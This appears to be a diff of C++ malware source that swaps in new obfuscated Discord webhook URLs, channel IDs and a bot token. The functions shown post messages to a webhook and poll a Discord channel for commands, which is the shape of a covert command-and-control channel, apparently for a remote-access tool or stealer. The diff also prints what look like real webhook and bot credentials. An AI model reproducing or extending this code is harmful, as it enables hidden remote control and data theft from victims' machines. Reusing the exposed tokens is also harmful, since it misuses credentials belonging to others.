@@ -71,7 +71,7 @@ std::string SendWinHttpRequest(const std::wstring& host, const std::wstring& pat
 
 bool send_discord_message(const std::string& message) {
     auto host = OBFUSCATE(L"discord.com");
-    auto path = OBFUSCATE(L"/api/webhooks/1495400658042126749/0dGZSbTh5akJQY0FYb3VKaW5hTVRvVkcySDEydVlhVVhQSkNJbHcteldycTRJYnlsakNTbU5OUV9MM3JoOWViNi1SbCI=");
+    auto path = OBFUSCATE(L"/api/webhooks/1494406576662909091/D7saO5wPoWqP1lP0QdN4EzCX5DfaHnZVP4dXrTOS1-FlEM1vU_zHHochrZe_FVXMCAn1");
     host.decrypt(); path.decrypt();
 
     std::string jsonPayload = "{\"content\":\"" + message + "\"}";
@@ -87,8 +87,8 @@ bool send_discord_message(const std::string& message) {
 
 std::string poll_discord_commands(std::string& lastMessageId) {
     auto host = OBFUSCATE(L"discord.com");
-    auto path = OBFUSCATE(L"/api/v10/channels/1495400658042126749/messages?limit=1");
-    auto token = OBFUSCATE(L"Authorization: Bot MTQ5NDQwNTc3OTgwODE5MDUxNC5MTQ5NDQwNTc3OTgwODE5MDUxQw==\r\n");
+    auto path = OBFUSCATE(L"/api/v10/channels/1494405781213417644/messages?limit=1");
+    auto token = OBFUSCATE(L"Authorization: Bot MTQ5NDQwNjA0NjAxNjYwMjE0Mw.GEIWLD.jq3LQoPO8cPPil_E78jU-9cQx6377xGtxIUU80\r\n");
     host.decrypt(); path.decrypt(); token.decrypt();
 
     std::wstring reqPath = path.data;
